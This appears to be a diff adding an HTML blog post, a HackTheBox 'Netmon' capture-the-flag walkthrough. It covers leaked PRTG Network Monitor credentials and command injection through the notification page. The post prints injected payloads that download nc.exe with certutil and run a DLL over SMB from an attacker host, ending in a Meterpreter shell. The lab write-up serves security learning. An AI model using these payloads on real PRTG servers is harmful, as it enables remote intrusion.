@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>HackTheBox - Netmon WT - </title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Kad3cl" /><meta name="description" content="Box IP: 10.10.10.152 Reconnaissance 1) I started with scanning network. Here&amp;rsquo;s what I found
+2) Port 80, we have a login page or PRTG Network Monitor. I found it was vulnerable for cross site Vulnerability
+3) filezilla, I messed around with ftp 21..looking for the configuration.old file that contained the creds according to this post on reddit https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/ .. But I couldnt find it.. later on I was hinted that It was a hiddden file." />
+
+
+<meta name="robots" content="">
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0 with even 4.0.0" />
+
+
+<link rel="canonical" href="/post/hackthebox-netmon/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.58b28b82.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="HackTheBox - Netmon WT" />
+<meta property="og:description" content="Box IP: 10.10.10.152 Reconnaissance 1) I started with scanning network. Here&rsquo;s what I found
+2) Port 80, we have a login page or PRTG Network Monitor. I found it was vulnerable for cross site Vulnerability
+3) filezilla, I messed around with ftp 21..looking for the configuration.old file that contained the creds according to this post on reddit https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/ .. But I couldnt find it.. later on I was hinted that It was a hiddden file." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/hackthebox-netmon/" />
+<meta property="article:published_time" content="2019-03-03T20:50:01-05:00" />
+<meta property="article:modified_time" content="2019-03-03T20:50:01-05:00" />
+<meta itemprop="name" content="HackTheBox - Netmon WT">
+<meta itemprop="description" content="Box IP: 10.10.10.152 Reconnaissance 1) I started with scanning network. Here&rsquo;s what I found
+2) Port 80, we have a login page or PRTG Network Monitor. I found it was vulnerable for cross site Vulnerability
+3) filezilla, I messed around with ftp 21..looking for the configuration.old file that contained the creds according to this post on reddit https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/ .. But I couldnt find it.. later on I was hinted that It was a hiddden file.">
+
+
+<meta itemprop="datePublished" content="2019-03-03T20:50:01-05:00" />
+<meta itemprop="dateModified" content="2019-03-03T20:50:01-05:00" />
+<meta itemprop="wordCount" content="383">
+
+
+
+<meta itemprop="keywords" content="hackthebox,htb," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox - Netmon WT"/>
+<meta name="twitter:description" content="Box IP: 10.10.10.152 Reconnaissance 1) I started with scanning network. Here&rsquo;s what I found
+2) Port 80, we have a login page or PRTG Network Monitor. I found it was vulnerable for cross site Vulnerability
+3) filezilla, I messed around with ftp 21..looking for the configuration.old file that contained the creds according to this post on reddit https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/ .. But I couldnt find it.. later on I was hinted that It was a hiddden file."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">KAD3CL</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">KAD3CL</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">HackTheBox - Netmon WT</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-03-03 </span>
+        
+          <span class="more-meta"> 383 words </span>
+          <span class="more-meta"> 2 mins read </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#box-ip-10-10-10-152">Box IP: 10.10.10.152</a></li>
+</ul></li>
+<li><a href="#reconnaissance">Reconnaissance</a></li>
+<li><a href="#i-used-exploit-46527">I USED exploit# 46527</a></li>
+<li><a href="#for-some-reason-the-shell-from-nc-din-t-work-or-i-didn-t-get-a-full-shell">For some reason the shell from nc din&rsquo;t work or I didn&rsquo;t get a full shell</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p><img src="/images/htb-Netmon/img1.png" alt="alt text" />
+<img src="/images/htb-Netmon/img2.png" alt="alt text" /></p>
+
+<h2 id="box-ip-10-10-10-152">Box IP: 10.10.10.152</h2>
+
+<h1 id="reconnaissance">Reconnaissance</h1>
+
+<p>1) I started with scanning network. Here&rsquo;s what I found</p>
+
+<p><img src="/images/htb-Netmon/img3.png" alt="alt text" />
+<img src="/images/htb-Netmon/img4.png" alt="alt text" /></p>
+
+<p>2) Port 80,  we have a login page or PRTG Network Monitor. I found it was vulnerable for cross site Vulnerability</p>
+
+<p><img src="/images/htb-Netmon/img5.png" alt="alt text" /></p>
+
+<p>3) filezilla, I messed around with ftp 21..looking for the configuration.old file that contained the creds according to this post on reddit
+  <a href="https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/">https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/</a>
+  .. But I couldnt find it.. later on I was hinted that It was a hiddden file.. So I had “force hidden files” unchecked once I checked that we found it in /programData/Paessler/PRTG Network Monitor</p>
+
+<p><img src="/images/htb-Netmon/img6.png" alt="alt text" />
+<img src="/images/htb-Netmon/img8.png" alt="alt text" />
+<img src="/images/htb-Netmon/img9.png" alt="alt text" />
+ I found it&hellip;it was in programdata/passeler/PRTG Configuration.old.bak</p>
+
+<p><strong>prtgadmin  →  PrTg@dmin2018<br />
+  I was getting incorrect login with this one,   until  I had help from legov
+  and found that it would be PrTg@dmin2019</strong></p>
+
+<p><img src="/images/htb-Netmon/img10.png" alt="alt text" /></p>
+
+<p>4) In filezilla , after I enabled to show hidden files, under server&gt;show hidden files,I f ound USER.txt in /Users/Public</p>
+
+<p><img src="/images/htb-Netmon/img11.png" alt="alt text" /></p>
+
+<p>5) With the login credentials we can log in</p>
+
+<p><img src="/images/htb-Netmon/img12.png" alt="alt text" />
+<img src="/images/htb-Netmon/img13.png" alt="alt text" /></p>
+
+<p>This CVe Was helpful where we can run remote command through the notification page</p>
+
+<p><a href="https://www.ptsecurity.com/ww-en/analytics/threatscape/pt-2018-23/">https://www.ptsecurity.com/ww-en/analytics/threatscape/pt-2018-23/</a></p>
+
+<p><a href="https://www.codewatch.org/blog/?p=453">https://www.codewatch.org/blog/?p=453</a></p>
+
+<p><a href="https://www.exploit-db.com/exploits/46527">https://www.exploit-db.com/exploits/46527</a></p>
+
+<h1 id="i-used-exploit-46527">I USED exploit# 46527</h1>
+
+<p>6) I created a simplehttpserver to send nc.exe and payloads to  maybe try and establish a session
+<img src="/images/htb-Netmon/img18.png" alt="alt text" />
+<img src="/images/htb-Netmon/img19.png" alt="alt text" /></p>
+
+<p>7) In the &ldquo;create_user()&rdquo; function on the 7th line in the fig below starting from the &amp;message_10 parameter
+ we inject a html encoded command that will run through the notification page</p>
+
+<p><strong>test.txt|&ldquo;certutil.exe -urlcache -split -f <a href="http://10.10.12.11/nc.exe">http://10.10.12.11/nc.exe</a> c:\users\public\Music\nc.exe&rdquo;</strong> but it should be html encoded
+<img src="/images/htb-Netmon/img17.png" alt="alt text" /></p>
+
+<p><img src="/images/htb-Netmon/img15.png" alt="alt text" /></p>
+
+<p>8) A certutil get request to  httpserver, yes it was for certp.exe. I tried many things before that. But same method works to upload nc.exe.</p>
+
+<p><img src="/images/htb-Netmon/img30.png" alt="alt text" /></p>
+
+<p>9) Next I used the same script to enter another html encoded command to run nc.exe and I had a listener setup on my kali to establish a connection</p>
+
+<p><img src="/images/htb-Netmon/img16.png" alt="alt text" />
+<img src="/images/htb-Netmon/img21.png" alt="alt text" /></p>
+
+<h1 id="for-some-reason-the-shell-from-nc-din-t-work-or-i-didn-t-get-a-full-shell">For some reason the shell from nc din&rsquo;t work or I didn&rsquo;t get a full shell</h1>
+
+<hr />
+
+<p>Here&rsquo;s what worked</p>
+
+<p><img src="/images/htb-Netmon/img22.png" alt="alt text" /></p>
+
+<p>10) F12 after you log-in to pullup _inspect element and get the cookie paramters</p>
+
+<p><img src="/images/htb-Netmon/img23.png" alt="alt text" />
+<em><code>Inside rundl32.sh.. The most important paramenter...After &quot;&amp;message_10=&quot;</code></em></p>
+
+<p><img src="/images/htb-Netmon/img24.png" alt="alt text" /></p>
+
+<p>11) Used w3school to encode html</p>
+
+<p><code>test.txt|&quot;rundll32.exe \\10.10.12.11\uqMdU\test.dll,0&quot;</code>
+<img src="/images/htb-Netmon/img26.png" alt="alt text" /></p>
+
+<p>#<code>text=test.txt%7C%22rundll32.exe+%5C%5C10.10.12.11%5CuqMdU%5Ctest.dll%2C0%22</code></p>
+
+<p>12) running rundl32.sh12) running rundl32.sh  we see the name titanrundl2 uploaded to notification page</p>
+
+<p><img src="/images/htb-Netmon/img29.png" alt="lt text" /></p>
+
+<p>13) I used windows/smb/smb_delievery exploit with a job running on port8081
+<img src="/images/htb-Netmon/img28.png" alt="alt text" />
+<img src="/images/htb-Netmon/img27.png" alt="alt text" />
+And we get a meterpreter shell session opened. Awesome</p>
+
+<p><img src="/images/htb-Netmon/img31.png" alt="alt text" />
+<img src="/images/htb-Netmon/img32.png" alt="alt text" /></p>
+
+<p>#LADIES AND GENTLEMEN WE ARE IN :))))))))))))))))))))))</p>
+
+<p><img src="/images/htb-Netmon/img33.png" alt="alt text" />
+<img src="/images/htb-Netmon/img34.png" alt="alt text" />
+<img src="/images/htb-Netmon/img35.png" alt="alt text" /></p>
+
+<p><strong>3018977fb944bf1878f75b879fba67cc</strong></p>
+
+<p>DONE TOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOK ME AWILLEEEEEEEEEEEEEEEEEEEEee</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">
+      <a href="">Kad3cl</a>
+    </span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title"></span>
+    <span class="item-content">
+        2019-03-03
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title"></span>
+    <span class="item-content">
+        <a href="/post/hackthebox-netmon/">/post/hackthebox-netmon/</a>
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/hackthebox/">hackthebox</a>
+          <a href="/tags/htb/">htb</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/newarkctf2019/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Newarkctf19 writeup</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/hackthebox-access-wt/">
+            <span class="next-text nav-default">HackTheBox - ACCESS WT</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="http://localhost:1313" class="iconfont icon-github" title="github"></a>
+  <a href="/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+     - 
+    2019
+    <span class="heart">
+<style>.heart{color:#e25555;}</style>
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">kad3cl</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  <script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
